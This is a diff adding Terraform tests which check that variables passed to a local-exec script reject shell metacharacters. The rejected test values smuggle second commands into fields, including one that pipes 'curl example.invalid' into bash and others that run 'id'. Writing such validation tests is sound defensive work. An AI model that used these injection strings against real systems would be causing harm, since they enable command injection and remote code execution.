@@ -69,3 +69,33 @@ run "existing_network_config" {
     error_message = "Should be able to disable network creation"
   }
 }
+
+# Values that reach a local-exec script must be rejected at plan time when they
+# carry shell metacharacters (they are passed as environment variables too).
+run "shell_metacharacters_rejected" {
+  command = plan
+
+  variables {
+    project_id                = "test-project-123"
+    istio_version             = "1.30.3\"; curl example.invalid | bash; echo \""
+    gke_cluster               = "gke$(id)"
+    region                    = "us-central1;id"
+    resource_creator_identity = "x'; id; echo '"
+  }
+
+  expect_failures = [
+    var.istio_version,
+    var.gke_cluster,
+    var.region,
+    var.resource_creator_identity,
+  ]
+}
+
+run "istio_prerelease_version_accepted" {
+  command = plan
+
+  variables {
+    project_id    = "test-project-123"
+    istio_version = "1.31.0-beta.1"
+  }
+}
